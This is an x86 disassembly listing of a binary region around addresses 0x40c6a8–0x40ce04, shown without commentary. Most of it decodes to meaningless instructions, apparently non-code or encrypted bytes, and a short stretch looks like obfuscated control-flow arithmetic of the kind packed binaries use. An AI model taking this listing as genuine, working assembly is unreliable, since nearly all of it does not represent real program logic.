  40c6a8:	or     bl,BYTE PTR [eax]
  40c6aa:	test   BYTE PTR [edi+0x55cf4c6a],ah
  40c6b0:	cmp    BYTE PTR [esi+0x78ee7335],bh
  40c6b6:	mov    BYTE PTR [edx-0x4c],bl
  40c6b9:	loopne 0x40c656
  40c6bb:	in     al,0x56
  40c6bd:	pop    ebx
  40c6be:	ins    BYTE PTR es:[edi],dx
  40c6bf:	mov    cl,0x41
  40c6c1:	dec    eax
  40c6c2:	rcl    DWORD PTR [ecx+0x52036a85],cl
  40c6c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c9:	mov    ds:0x72cb34cd,eax
  40c6ce:	inc    ecx
  40c6cf:	add    eax,0xffe70e5e
  40c6d4:	arpl   WORD PTR [edx-0x26],sp
  40c6d7:	out    dx,al
  40c6d8:	or     eax,0xaf820365
  40c6dd:	fadd   DWORD PTR [edx+ebx*4+0x1]
  40c6e1:	push   esi
  40c6e2:	push   cs
  40c6e3:	add    al,0xfa
  40c6e5:	or     eax,0x9666c9f2
  40c6ea:	(bad)  
  40c6eb:	loop   0x40c74a
  40c6ed:	push   eax
  40c6ee:	sub    esp,ebx
  40c6f0:	cmp    edx,ebp
  40c6f2:	(bad)  
  40c6f3:	fucom  st(4)
  40c6f5:	inc    ebp
  40c6f6:	cmp    al,cl
  40c6f8:	mov    eax,ds:0xdfa6a431
  40c6fd:	mov    edi,0x18661faf
  40c702:	pop    ebx
  40c703:	dec    ebx
  40c704:	mov    dh,0x64
  40c706:	pop    ecx
  40c707:	and    eax,0x5dc4691a
  40c70c:	ret    0xa39f
  40c70f:	and    edi,DWORD PTR [edx-0x2d1a8f06]
  40c715:	fistp  WORD PTR [ebp+0x64e92ede]
  40c71b:	or     ebx,DWORD PTR [ebp+ecx*1+0x7adcefd5]
  40c722:	add    eax,0xeee095c8
  40c727:	mov    cl,0x49
  40c729:	mov    al,0xa5
  40c72b:	pop    edi
  40c72c:	iret   
  40c72d:	xchg   edi,eax
  40c72e:	stos   DWORD PTR es:[edi],eax
  40c72f:	adc    DWORD PTR ds:0x7fe025d1,eax
  40c735:	sub    DWORD PTR [ebp-0x24],ebp
  40c738:	lea    edx,[eax]
  40c73a:	push   cs
  40c73b:	xchg   esp,eax
  40c73c:	and    bl,BYTE PTR [ecx+esi*8]
  40c73f:	xlat   BYTE PTR ds:[ebx]
  40c740:	je     0x40c6e0
  40c742:	add    eax,0x4549ef69
  40c747:	scas   al,BYTE PTR es:[edi]
  40c748:	std    
  40c749:	fwait
  40c74a:	dec    edx
  40c74b:	js     0x40c7c8
  40c74d:	aas    
  40c74e:	sbb    eax,0xf23a3c65
  40c753:	mov    ss:0x3f5d6981,eax
  40c759:	cwde   
  40c75a:	or     eax,DWORD PTR [esi+0x7d]
  40c75d:	mov    eax,0xe448ea93
  40c762:	inc    esi
  40c763:	push   ebx
  40c764:	xlat   BYTE PTR ds:[ebx]
  40c765:	in     eax,dx
  40c766:	mov    eax,0x3279f688
  40c76b:	call   0x9fe56fc5
  40c770:	int    0xa
  40c772:	fisttp WORD PTR [edx+0xc]
  40c775:	pushf  
  40c776:	pop    ebx
  40c777:	rcl    DWORD PTR [esi],cl
  40c779:	jp     0x40c7a5
  40c77b:	add    DWORD PTR [ebx-0x2bf9b344],0x6a
  40c782:	ficomp DWORD PTR [esi-0x6d104b4]
  40c788:	cmc    
  40c789:	dec    esp
  40c78a:	sub    BYTE PTR [eax-0x22],bl
  40c78d:	fist   DWORD PTR [edx-0x30df8b2b]
  40c793:	pop    eax
  40c794:	ret    
  40c795:	ss ret 
  40c797:	aaa    
  40c798:	nop
  40c799:	or     al,0x54
  40c79b:	xor    ebx,DWORD PTR [esi-0x6f7265ab]
  40c7a1:	pop    DWORD PTR [ebp-0x7f]
  40c7a4:	mov    eax,ecx
  40c7a6:	loope  0x40c7b8
  40c7a8:	ret    
  40c7a9:	out    dx,eax
  40c7aa:	fld    QWORD PTR [edx+0x1c64f192]
  40c7b0:	(bad)  
  40c7b2:	push   es
  40c7b3:	sahf   
  40c7b4:	pop    ebx
  40c7b5:	dec    ebx
  40c7b6:	jo     0x40c79a
  40c7b8:	pop    ebx
  40c7b9:	ins    BYTE PTR es:[edi],dx
  40c7ba:	inc    edx
  40c7bb:	(bad)  
  40c7bc:	fsincos 
  40c7be:	add    BYTE PTR [eax],0xd6
  40c7c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7c2:	cmc    
  40c7c3:	ds (bad) 
  40c7c5:	loop   0x40c764
  40c7c7:	pop    es
  40c7c8:	clc    
  40c7c9:	scas   al,BYTE PTR es:[edi]
  40c7ca:	into   
  40c7cb:	aad    0x30
  40c7cd:	xchg   DWORD PTR [ebp-0x79a336f6],esi
  40c7d3:	ret    
  40c7d4:	mov    bl,BYTE PTR [eax]
  40c7d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7d7:	sub    ebx,ecx
  40c7d9:	mov    ds:0x81e3e6f6,al
  40c7de:	jno    0x40c840
  40c7e0:	sbb    ah,BYTE PTR [esi]
  40c7e2:	sbb    BYTE PTR [edi-0x54],ch
  40c7e5:	cli    
  40c7e6:	fwait
  40c7e7:	xchg   BYTE PTR [edi],bh
  40c7e9:	dec    eax
  40c7ea:	inc    esp
  40c7eb:	xchg   bl,dh
  40c7ed:	call   0x1e782368
  40c7f2:	sub    ebp,DWORD PTR [ebp+eiz*4+0x2e918526]
  40c7f9:	pop    esp
  40c7fa:	fld    QWORD PTR [ebp+0x616b6b41]
  40c800:	inc    edi
  40c801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c802:	adc    al,0x64
  40c804:	sbb    al,0x3c
  40c807:	jle    0x40c7db
  40c809:	addr16 imul ebx,esi,0xfca27c0c
  40c810:	inc    ecx
  40c811:	lock in eax,0x85
  40c814:	into   
  40c815:	retf   
  40c816:	fcomp  QWORD PTR ds:0x1cf3dc20
  40c81c:	loopne 0x40c7a3
  40c81e:	lahf   
  40c81f:	aas    
  40c820:	mov    esi,0xaa6b5a65
  40c825:	adc    eax,0xa92e8a2c
  40c82a:	test   al,0xb2
  40c82c:	pop    ss
  40c82d:	xor    ah,ch
  40c82f:	sub    al,0xc0
  40c831:	xchg   esp,eax
  40c832:	and    dl,BYTE PTR [edx+0x7c]
  40c835:	scas   al,BYTE PTR es:[edi]
  40c836:	out    dx,al
  40c837:	jmp    0x994d:0xbd41d261
  40c83e:	int3   
  40c83f:	loopne 0x40c81c
  40c841:	sbb    al,0xaa
  40c843:	rcr    DWORD PTR [edi-0x30b3a982],1
  40c849:	scas   eax,DWORD PTR es:[edi]
  40c84a:	test   esp,ebx
  40c84c:	inc    edx
  40c84d:	(bad)  
  40c84e:	(bad)  
  40c850:	add    DWORD PTR [eax],esi
  40c852:	pop    ss
  40c853:	mov    edx,DWORD PTR [edi]
  40c855:	les    edx,FWORD PTR [edi*4-0x72435866]
  40c85c:	popa   
  40c85d:	lahf   
  40c85e:	push   ss
  40c85f:	inc    esi
  40c860:	ds out 0x60,al
  40c863:	fsubr  st(0),st
  40c865:	dec    edx
  40c866:	adc    BYTE PTR [esi-0x29be9d6e],ah
  40c86c:	lods   al,BYTE PTR ds:[esi]
  40c86d:	sub    edx,DWORD PTR [edi]
  40c86f:	aad    0x16
  40c871:	push   0x54
  40c873:	shr    DWORD PTR [ecx+0x6f99f1a7],cl
  40c879:	fiadd  DWORD PTR [ebp+ebp*2-0x481d34d5]
  40c880:	jmp    FWORD PTR [edx+0x33]
  40c883:	cs push 0xe777a6ff
  40c889:	ret    0xb05c
  40c88c:	mov    eax,0xa852e57a
  40c891:	pusha  
  40c892:	fs dec ebp
  40c894:	sar    BYTE PTR [esi-0x6e],cl
  40c897:	inc    eax
  40c898:	retf   
  40c899:	or     DWORD PTR [edx+0x2d5863ce],0x1fb0b7c9
  40c8a3:	inc    ecx
  40c8a4:	dec    edi
  40c8a5:	mov    dl,ch
  40c8a7:	mov    ebp,0xdeb5ee48
  40c8ac:	pop    ecx
  40c8ad:	or     DWORD PTR ds:0x4afda85b,ebx
  40c8b3:	clc    
  40c8b4:	cwde   
  40c8b5:	add    bl,BYTE PTR [eax]
  40c8b7:	in     eax,0x62
  40c8b9:	scas   eax,DWORD PTR es:[edi]
  40c8ba:	add    ah,bh
  40c8bc:	(bad)  
  40c8bd:	pop    ds
  40c8be:	jmp    DWORD PTR [edi-0x6930c0f1]
  40c8c4:	mov    ecx,0x87596f78
  40c8c9:	jecxz  0x40c8c7
  40c8cb:	xor    BYTE PTR [ecx],0x70
  40c8ce:	das    
  40c8cf:	scas   al,BYTE PTR es:[edi]
  40c8d0:	lds    ebx,FWORD PTR [ecx]
  40c8d2:	test   BYTE PTR [eax],ch
  40c8d4:	test   esi,eax
  40c8d6:	(bad)  [ecx]
  40c8d8:	div    BYTE PTR [edi+0x47]
  40c8db:	xor    DWORD PTR [ebp-0x64c72c78],esi
  40c8e1:	pop    ebx
  40c8e2:	rcr    BYTE PTR [eax+0x16e867e],1
  40c8e8:	mov    ch,BYTE PTR [ecx]
  40c8ea:	(bad)  
  40c8eb:	jl     0x40c94a
  40c8ed:	aad    0xf4
  40c8ef:	ror    BYTE PTR [esi+ecx*2-0x27],0xf0
  40c8f4:	adc    al,0x3c
  40c8f6:	xor    ch,dh
  40c8f8:	and    DWORD PTR [esi+eiz*8+0x5b3286e9],ebx
  40c8ff:	int3   
  40c900:	push   ecx
  40c901:	ret    0xef
  40c904:	out    0xd,al
  40c906:	in     al,0x46
  40c908:	mov    dh,0x4b
  40c90a:	jns    0x40c8fc
  40c90c:	in     eax,0xb4
  40c90e:	bnd ret 0xe525
  40c912:	stos   BYTE PTR es:[edi],al
  40c913:	push   edi
  40c914:	jns    0x4c63b899
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x254c5e53
  40c96a:	repz dec ebx
  40c96c:	and    eax,0x78789d32
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	dec    ebp
  40c976:	xor    BYTE PTR [edi-0x6f],al
  40c979:	sbb    eax,0x1ca91a07
  40c97e:	jmp    0x40c982
  40c980:	push   ds
  40c981:	test   eax,0xc134032e
  40c986:	call   0xa5e8e0fa
  40c98b:	mov    al,ds:0x53bfab72
  40c990:	stos   DWORD PTR es:[edi],eax
  40c991:	mov    dl,0x44
  40c993:	cmovnp edx,DWORD PTR [ebx]
  40c996:	fwait
  40c997:	mov    ds:0x689c3357,eax
  40c99c:	popf   
  40c99d:	add    DWORD PTR [si],ecx
  40c9a0:	pop    edi
  40c9a1:	icebp  
  40c9a2:	test   eax,0x24c40d8f
  40c9a7:	cld    
  40c9a8:	les    ebp,FWORD PTR [edx-0x12621470]
  40c9ae:	(bad)  
  40c9af:	(bad)  
  40c9b1:	out    dx,al
  40c9b2:	stc    
  40c9b3:	xor    dl,cl
  40c9b5:	mov    dl,0xb9
  40c9b7:	lahf   
  40c9b8:	cwde   
  40c9b9:	cli    
  40c9ba:	dec    esp
  40c9bb:	cmp    DWORD PTR [edx+0x19db5a9d],edx
  40c9c1:	push   es
  40c9c2:	aas    
  40c9c3:	ud2    
  40c9c5:	dec    eax
  40c9c6:	inc    eax
  40c9c7:	jmp    0xc1ad1e59
  40c9cc:	lds    ebp,FWORD PTR [esi-0x1fbb1625]
  40c9d2:	and    BYTE PTR [ebx-0x1],ah
  40c9d5:	jne    0x40c9fe
  40c9d7:	adc    eax,0x35d18eb7
  40c9dc:	das    
  40c9dd:	ins    DWORD PTR es:[edi],dx
  40c9de:	or     bl,BYTE PTR [esi-0x77783c40]
  40c9e4:	sub    eax,0x2e080cbc
  40c9e9:	inc    ecx
  40c9ea:	mov    edx,0xaf3b86ae
  40c9ef:	cmp    BYTE PTR [edx+0x39],dh
  40c9f2:	push   es
  40c9f3:	cs (bad) 
  40c9f5:	test   eax,0xcf43fbf3
  40c9fa:	pop    eax
  40c9fb:	call   0xf117dc4e
  40ca00:	mov    dh,BYTE PTR [ebx-0x24]
  40ca03:	scas   eax,DWORD PTR es:[edi]
  40ca04:	leave  
  40ca05:	xchg   ebx,eax
  40ca06:	or     bl,bl
  40ca08:	fmulp  st(7),st
  40ca0a:	pop    esp
  40ca0b:	stos   DWORD PTR es:[edi],eax
  40ca0c:	adc    BYTE PTR [ebp+0x77],al
  40ca0f:	(bad)  
  40ca10:	and    DWORD PTR ds:0xf5721970,eax
  40ca16:	fiadd  WORD PTR [eax+0x18]
  40ca19:	fsubr  QWORD PTR [ecx+0x4a]
  40ca1c:	in     al,0x6e
  40ca1e:	add    BYTE PTR [eax+0x1f],al
  40ca21:	inc    esp
  40ca22:	adc    DWORD PTR [edx+0x294d7dff],edi
  40ca28:	push   es
  40ca29:	mov    ds:0x72918903,eax
  40ca2e:	aas    
  40ca2f:	add    eax,DWORD PTR [eax]
  40ca31:	dec    esp
  40ca32:	dec    eax
  40ca33:	mov    ah,0xb9
  40ca35:	rol    DWORD PTR [edi+0x7d],1
  40ca38:	stos   DWORD PTR es:[edi],eax
  40ca39:	jns    0x40c9e8
  40ca3b:	or     al,0xfd
  40ca3d:	mov    ah,0x45
  40ca3f:	neg    DWORD PTR [eax-0x2c]
  40ca42:	push   0xc91142d0
  40ca47:	mov    ecx,0x9786276c
  40ca4c:	repnz cmp esp,DWORD PTR [ecx]
  40ca4f:	enter  0xa661,0x24
  40ca53:	sub    dl,BYTE PTR [esp+eax*4+0x36]
  40ca57:	adc    DWORD PTR [ebx-0x5b],ebx
  40ca5a:	pop    esp
  40ca5b:	dec    esp
  40ca5c:	and    eax,0x646efc7b
  40ca61:	xlat   BYTE PTR ds:[ebx]
  40ca62:	pop    esp
  40ca63:	(bad)  
  40ca64:	pusha  
  40ca65:	mov    esp,DWORD PTR [ecx+0x3ca5a557]
  40ca6b:	dec    edx
  40ca6c:	jnp    0x40c9ef
  40ca6e:	rcl    ch,0xbd
  40ca71:	mov    DWORD PTR [ebp+0x2892a6b9],ecx
  40ca77:	mov    ebx,0xcfb72aae
  40ca7c:	mov    eax,ds:0x1b3a8178
  40ca81:	lds    edi,FWORD PTR fs:[edx+eiz*1]
  40ca85:	mov    ecx,0xccadad2b
  40ca8a:	jl     0x40cad6
  40ca8c:	or     cl,bh
  40ca8e:	popf   
  40ca8f:	mov    dh,BYTE PTR ds:0xbc4c909
  40ca95:	xor    dh,BYTE PTR [esi]
  40ca97:	sub    BYTE PTR [eax-0x3c],0xef
  40ca9b:	mov    bh,0x2
  40ca9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca9e:	jge    0x40cadd
  40caa0:	sbb    eax,0x34b634a5
  40caa5:	mov    ds:0xf18c89ba,eax
  40caaa:	mov    eax,0xc6302236
  40caaf:	shr    ah,0xe9
  40cab2:	mov    ch,cl
  40cab4:	(bad)  [edx+0x3f1ce633]
  40caba:	xor    ecx,DWORD PTR [esi*4-0x18991454]
  40cac1:	mov    ebp,0x16167e70
  40cac6:	cdq    
  40cac7:	adc    eax,0xb597264a
  40cacc:	inc    edx
  40cacd:	mov    cl,0x98
  40cacf:	das    
  40cad0:	out    0xb3,eax
  40cad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad3:	in     al,0x57
  40cad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cad6:	sbb    BYTE PTR [ebp+0x3c],bl
  40cad9:	jbe    0x40ca72
  40cadb:	dec    esp
  40cadc:	ins    DWORD PTR es:[edi],dx
  40cadd:	aam    0xe8
  40cadf:	rol    eax,1
  40cae1:	fist   WORD PTR [ebx]
  40cae3:	sbb    eax,0x38d0619d
  40cae8:	dec    eax
  40cae9:	or     al,0x13
  40caeb:	stos   BYTE PTR es:[edi],al
  40caec:	pop    edi
  40caed:	push   esi
  40caee:	jns    0x40cb2c
  40caf0:	mov    ch,0xb0
  40caf2:	or     eax,0x4504d320
  40caf7:	stc    
  40caf8:	ja     0x40cab8
  40cafa:	lea    esp,[edx+ebp*2+0x58]
  40cafe:	dec    ecx
  40caff:	add    eax,0xd041d9a2
  40cb04:	pop    eax
  40cb06:	inc    ebx
  40cb07:	sbb    esi,edi
  40cb09:	and    DWORD PTR ds:0xa71e571f,0x603c0f3f
  40cb13:	inc    ecx
  40cb14:	sbb    eax,0x37bd5750
  40cb19:	cmp    edx,esp
  40cb1b:	push   edi
  40cb1c:	into   
  40cb1d:	mov    esp,0x92a32cc3
  40cb22:	in     ax,0x9c
  40cb25:	lods   eax,DWORD PTR ds:[esi]
  40cb26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb27:	hlt    
  40cb28:	pop    ecx
  40cb29:	jnp    0x40cadd
  40cb2b:	fld    TBYTE PTR [ecx]
  40cb2d:	xchg   dh,ch
  40cb2f:	sub    dh,BYTE PTR [eax+ebx*1+0x6a]
  40cb33:	addr16 xor esi,ecx
  40cb36:	js     0x40cb31
  40cb38:	outs   dx,BYTE PTR ds:[esi]
  40cb39:	inc    esp
  40cb3a:	out    dx,al
  40cb3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb3c:	pop    ds
  40cb3d:	dec    esp
  40cb3e:	jmp    0x59e8c0bb
  40cb43:	les    esi,FWORD PTR [ecx+0x7dbdb5df]
  40cb49:	lea    ecx,[esi]
  40cb4b:	nop
  40cb4c:	loopne 0x40cad3
  40cb4e:	inc    eax
  40cb4f:	mov    ds:0x1af7d207,eax
  40cb54:	add    esp,DWORD PTR [edx]
  40cb56:	into   
  40cb57:	inc    ebp
  40cb58:	sub    BYTE PTR [ecx],0x93
  40cb5b:	xchg   cl,cl
  40cb5d:	xchg   esi,eax
  40cb5e:	loopne 0x40cbd1
  40cb60:	or     eax,0x51d759b
  40cb65:	jnp    0x40cbcc
  40cb67:	cwde   
  40cb68:	sub    al,0xa6
  40cb6a:	and    al,0x5e
  40cb6c:	call   0x5d72c4f9
  40cb71:	inc    ebx
  40cb72:	jae    0x40cbdd
  40cb74:	cmc    
  40cb75:	scas   al,BYTE PTR es:[edi]
  40cb76:	push   eax
  40cb77:	lds    eax,FWORD PTR [edx-0x1f]
  40cb7a:	adc    DWORD PTR [esi],0x50
  40cb7d:	jne    0x40cbb0
  40cb7f:	(bad)  
  40cb80:	adc    BYTE PTR [edx],ch
  40cb82:	jnp    0x40cbfd
  40cb84:	fisttp QWORD PTR [edi+edx*2-0x7e2106aa]
  40cb8b:	mov    ah,0x8d
  40cb8d:	push   ecx
  40cb8e:	fdiv   st,st(5)
  40cb90:	cwde   
  40cb91:	cmp    al,0x53
  40cb93:	aad    0xae
  40cb95:	out    0x8e,eax
  40cb97:	or     eax,0x8428777f
  40cb9c:	push   di
  40cb9e:	inc    ebp
  40cb9f:	cmp    al,BYTE PTR [ebx+ecx*2+0x20de56e5]
  40cba6:	dec    eax
  40cba7:	push   ss
  40cba8:	jne    0x40cbd1
  40cbaa:	jmp    0x2eed:0xa1f88e85
  40cbb1:	cld    
  40cbb2:	imul   ebx,eax,0x31639f80
  40cbb8:	mov    esi,0xac607cd
  40cbbd:	data16 xor bl,bh
  40cbc0:	inc    ebp
  40cbc1:	fnstcw WORD PTR [edi-0x5b]
  40cbc4:	inc    eax
  40cbc5:	mov    al,ds:0xf8372b9e
  40cbca:	cmp    BYTE PTR [edx+edx*2],ah
  40cbcd:	pop    ss
  40cbce:	add    ebp,DWORD PTR [ebx]
  40cbd0:	push   eax
  40cbd1:	ins    BYTE PTR es:[edi],dx
  40cbd2:	mov    dh,0x42
  40cbd4:	cld    
  40cbd5:	sub    eax,0x72800990
  40cbda:	pusha  
  40cbdb:	pop    ebp
  40cbdc:	enter  0x3656,0x95
  40cbe0:	jne    0x40cb7d
  40cbe2:	in     eax,dx
  40cbe3:	xchg   edx,eax
  40cbe4:	mov    eax,0x8ca32bc7
  40cbe9:	jg     0x40cbc7
  40cbeb:	mov    dl,0x3b
  40cbed:	push   DWORD PTR [edi]
  40cbef:	arpl   WORD PTR [ecx+0x3d9ab40f],di
  40cbf5:	xchg   ebx,eax
  40cbf6:	aas    
  40cbf7:	cwde   
  40cbf8:	xlat   BYTE PTR ds:[ebx]
  40cbf9:	add    eax,0xe309b7d2
  40cbfe:	int    0x23
  40cc00:	pop    esi
  40cc01:	jecxz  0x40cb93
  40cc03:	in     eax,dx
  40cc04:	mov    cl,0xe
  40cc06:	test   BYTE PTR [edx-0x68],ah
  40cc09:	call   0x5ff088a3
  40cc0e:	xor    bl,bl
  40cc10:	iret   
  40cc11:	fisub  WORD PTR [eax+eiz*1]
  40cc14:	hlt    
  40cc15:	cld    
  40cc16:	or     ebx,DWORD PTR [edi+0x1f245698]
  40cc1c:	mov    cl,0xdd
  40cc1e:	mov    ss,WORD PTR [edi-0x2715534e]
  40cc24:	mov    edi,0x9779d950
  40cc29:	fdivp  st(5),st
  40cc2b:	push   esi
  40cc2c:	nop
  40cc2d:	add    DWORD PTR [ebx],0xffffff98
  40cc30:	cmp    edx,ecx
  40cc32:	repz xchg ebx,eax
  40cc34:	jb     0x40cca8
  40cc36:	addr16 loop 0x40cc9a
  40cc39:	pop    edx
  40cc3a:	adc    al,0x5c
  40cc3c:	inc    ecx
  40cc3d:	pusha  
  40cc3e:	sub    al,0xc7
  40cc40:	in     eax,dx
  40cc41:	add    eax,0x8f2dc9bb
  40cc46:	pop    esp
  40cc47:	addr16 pop eax
  40cc49:	in     eax,0xac
  40cc4b:	loop   0x40cc8a
  40cc4d:	jge    0x40cc84
  40cc4f:	sub    bl,BYTE PTR ds:0x1d354c4a
  40cc55:	cmp    ecx,DWORD PTR [edx]
  40cc57:	cmp    eax,0xa85c30c
  40cc5c:	mov    esi,0xb8eed15d
  40cc61:	jecxz  0x40cc93
  40cc63:	jno    0x40cc98
  40cc65:	scas   al,BYTE PTR es:[edi]
  40cc66:	inc    edx
  40cc67:	in     eax,0xaf
  40cc69:	sti    
  40cc6a:	sbb    eax,0x165f1243
  40cc6f:	cmc    
  40cc70:	xor    edi,DWORD PTR [ecx]
  40cc72:	cmp    cl,ch
  40cc74:	adc    al,0x3
  40cc76:	add    BYTE PTR [eax],al
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0xae
  40cc85:	jbe    0x40cc44
  40cc87:	je     0x40ccb7
  40cc89:	mov    ds:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	lods   eax,DWORD PTR ds:[esi]
  40cc91:	mov    dl,0x26
  40cc93:	ss test ebp,edi
  40cc96:	xor    ch,BYTE PTR [edx+0x18fd09a5]
  40cc9c:	out    0x64,eax
  40cc9e:	gs and eax,0x6ccdec32
  40cca4:	dec    esp
  40cca5:	xlat   BYTE PTR ds:[ebx]
  40cca6:	inc    edx
  40cca7:	add    ch,bl
  40cca9:	scas   al,BYTE PTR es:[edi]
  40ccaa:	push   eax
  40ccab:	xor    eax,0x609e5fab
  40ccb0:	push   esp
  40ccb1:	sbb    eax,0xb0fdd268
  40ccb6:	out    dx,eax
  40ccb7:	cmp    DWORD PTR [ebx],0x17eb9c68
  40ccbd:	xor    eax,0x24cbd38b
  40ccc2:	cmp    BYTE PTR [eax],al
  40ccc4:	sub    ebp,DWORD PTR [ecx+0x735ddc7c]
  40ccca:	je     0x40cd44
  40cccc:	(bad)  
  40cccd:	mov    ebx,0xba33fb8f
  40ccd2:	adc    esp,DWORD PTR ds:0xb0c2e8b3
  40ccd8:	retf   0x1dbd
  40ccdb:	inc    eax
  40ccdc:	data16 mov BYTE PTR [eax-0x4f],bl
  40cce0:	ins    DWORD PTR es:[edi],dx
  40cce1:	pop    esi
  40cce2:	cmp    edx,DWORD PTR [edx-0x57c385f4]
  40cce8:	jbe    0x40ccb8
  40ccea:	xchg   edi,eax
  40cceb:	jge    0x40cc77
  40cced:	xchg   edi,eax
  40ccee:	sar    BYTE PTR [ecx],cl
  40ccf0:	jns    0x40ccb7
  40ccf2:	mov    al,ds:0x34bfe10d
  40ccf7:	jle    0x40cccc
  40ccf9:	dec    esp
  40ccfa:	and    eax,0xfa51adda
  40ccff:	pop    ecx
  40cd00:	ret    
  40cd01:	popf   
  40cd02:	aam    0xdf
  40cd04:	lods   al,BYTE PTR ds:[esi]
  40cd05:	addr16 mov ecx,0xb5e2c0db
  40cd0b:	mov    cl,dl
  40cd0d:	sar    DWORD PTR [ebp+0x150ec8d2],cl
  40cd13:	push   edx
  40cd14:	call   0xa75b05f
  40cd19:	xlat   BYTE PTR ds:[ebx]
  40cd1a:	cmp    edi,DWORD PTR [edi-0x923360e]
  40cd20:	pusha  
  40cd21:	sbb    al,0xf4
  40cd23:	fisttp DWORD PTR [ecx+0x53]
  40cd26:	xchg   BYTE PTR [esi+0x3e166cc],bl
  40cd2c:	ror    DWORD PTR [edx],0x15
  40cd2f:	and    al,0x55
  40cd31:	pop    eax
  40cd32:	(bad)  
  40cd33:	call   0x9b76:0x796f1d65
  40cd3a:	dec    ebx
  40cd3b:	(bad)  
  40cd3c:	push   ds
  40cd3d:	push   ebp
  40cd3e:	pop    edx
  40cd3f:	push   0xffffffea
  40cd41:	loope  0x40ccca
  40cd43:	pop    esp
  40cd44:	out    dx,eax
  40cd45:	xchg   edi,eax
  40cd46:	pushf  
  40cd47:	or     esi,DWORD PTR [edx-0x669c906c]
  40cd4d:	sub    edi,ecx
  40cd4f:	arpl   ax,cx
  40cd51:	xor    DWORD PTR fs:[ecx+0x8cbf7c9],edx
  40cd58:	sbb    edx,edi
  40cd5a:	repz imul eax,ebx,0x5f8df848
  40cd61:	pop    esi
  40cd62:	sub    al,0x95
  40cd64:	ins    BYTE PTR es:[edi],dx
  40cd65:	inc    edx
  40cd66:	cmp    DWORD PTR [edx],eax
  40cd68:	pop    ds
  40cd69:	shl    BYTE PTR [ecx],0x1e
  40cd6c:	lods   al,BYTE PTR ds:[esi]
  40cd6d:	lea    edi,[esi]
  40cd6f:	inc    eax
  40cd70:	ss leave 
  40cd72:	test   al,0x6e
  40cd74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd75:	sbb    BYTE PTR [ecx+0x38],bl
  40cd78:	nop
  40cd79:	xchg   esp,eax
  40cd7a:	adc    eax,0xea7ee412
  40cd7f:	dec    edx
  40cd80:	dec    ebx
  40cd81:	push   ebp
  40cd82:	cmp    edi,DWORD PTR [ecx]
  40cd84:	fstp   TBYTE PTR [ecx+eax*2-0x35]
  40cd88:	arpl   ax,bp
  40cd8a:	push   cs
  40cd8b:	add    esi,esp
  40cd8d:	sub    ecx,DWORD PTR [ebx*1-0x1920b6d4]
  40cd94:	test   BYTE PTR [edx+0x55e3f1a4],bl
  40cd9a:	inc    esi
  40cd9b:	fisubr WORD PTR [ebx]
  40cd9d:	jbe    0x40cd6d
  40cd9f:	outs   dx,DWORD PTR ds:[esi]
  40cda0:	xchg   esi,eax
  40cda1:	mul    BYTE PTR [eax-0x4aa95420]
  40cda7:	or     BYTE PTR [edx-0x4f],bh
  40cdaa:	sbb    cl,ah
  40cdac:	mov    cl,0x5
  40cdae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdaf:	cdq    
  40cdb0:	add    cl,BYTE PTR [esi-0x37]
  40cdb3:	sbb    DWORD PTR [esi+0x3a],esp
  40cdb6:	out    dx,eax
  40cdb7:	mov    WORD PTR [ecx-0x5e],cs
  40cdba:	dec    ebp
  40cdbb:	fnstenv [eax-0x43]
  40cdbe:	xchg   ebp,eax
  40cdbf:	mov    cl,0x56
  40cdc1:	pop    ss
  40cdc2:	aam    0xc3
  40cdc4:	xor    eax,0xc6a9bc4f
  40cdc9:	es push ss
  40cdcb:	dec    ebx
  40cdcc:	std    
  40cdcd:	stos   DWORD PTR es:[edi],eax
  40cdce:	pushf  
  40cdcf:	push   0xfffffffc
  40cdd1:	into   
  40cdd2:	jnp    0x40cdea
  40cdd4:	pusha  
  40cdd5:	ret    0x826a
  40cdd8:	mov    esi,0x8a07f2d7
  40cddd:	jmp    0x23ea:0x3d65eb46
  40cde4:	daa    
  40cde5:	push   ebp
  40cde6:	cmp    BYTE PTR [ebx-0x2e],cl
  40cde9:	mul    BYTE PTR [ecx+0x7ca26951]
  40cdef:	int    0x1e
  40cdf1:	push   edx
  40cdf2:	int3   
  40cdf3:	(bad)  
  40cdf4:	shl    DWORD PTR [ebx],cl
  40cdf6:	cli    
  40cdf7:	mov    edi,0xe4b10b
  40cdfc:	sub    cl,dl
  40cdfe:	sti    
  40cdff:	jae    0x40ce6d
  40ce01:	in     eax,dx
  40ce02:	and    al,0x33
  40ce04:	jecxz  0x40ce15
